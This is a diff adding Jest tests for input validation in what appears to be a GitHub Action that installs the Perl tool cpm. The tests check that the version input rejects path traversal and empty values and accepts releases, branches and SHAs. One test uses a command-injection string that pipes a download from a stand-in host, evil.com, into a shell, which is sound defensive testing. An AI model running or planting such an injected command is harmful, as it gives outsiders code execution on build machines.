@@ -559,6 +559,96 @@ describe("run", () => {
     });
 });
 
+describe("install_cpm version validation", () => {
+    test("rejects version with path traversal (..)", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "../../malicious/repo/main";
+            if (name === "sudo") return "false";
+            return "";
+        });
+        lib.set_perl("/usr/bin/perl");
+
+        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+            /invalid version/i
+        );
+        expect(tc.downloadTool).not.toHaveBeenCalled();
+    });
+
+    test("rejects version with spaces", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "main; curl evil.com | sh";
+            return "";
+        });
+        lib.set_perl("/usr/bin/perl");
+
+        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+            /invalid version/i
+        );
+    });
+
+    test("rejects empty version", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "";
+            return "";
+        });
+        lib.set_perl("/usr/bin/perl");
+
+        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+            /invalid version/i
+        );
+    });
+
+    test("accepts valid semver-like version", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "0.997014";
+            if (name === "sudo") return "false";
+            return "";
+        });
+        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
+        exec.exec.mockResolvedValue(0);
+        jest.spyOn(os, "platform").mockReturnValue("linux");
+        lib.set_perl("/usr/bin/perl");
+
+        await lib.install_cpm("/usr/local/bin/cpm");
+
+        expect(tc.downloadTool).toHaveBeenCalledWith(
+            "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
+        );
+    });
+
+    test("accepts valid branch name", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "main";
+            if (name === "sudo") return "false";
+            return "";
+        });
+        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
+        exec.exec.mockResolvedValue(0);
+        jest.spyOn(os, "platform").mockReturnValue("linux");
+        lib.set_perl("/usr/bin/perl");
+
+        await lib.install_cpm("/usr/local/bin/cpm");
+
+        expect(tc.downloadTool).toHaveBeenCalled();
+    });
+
+    test("accepts git SHA", async () => {
+        core.getInput.mockImplementation((name) => {
+            if (name === "version") return "abc123def456";
+            if (name === "sudo") return "false";
+            return "";
+        });
+        tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
+        exec.exec.mockResolvedValue(0);
+        jest.spyOn(os, "platform").mockReturnValue("linux");
+        lib.set_perl("/usr/bin/perl");
+
+        await lib.install_cpm("/usr/local/bin/cpm");
+
+        expect(tc.downloadTool).toHaveBeenCalled();
+    });
+});
+
 describe("do_exec mutation", () => {
     test("does not mutate the caller's cmd array", async () => {
         core.getInput.mockImplementation((name) => {
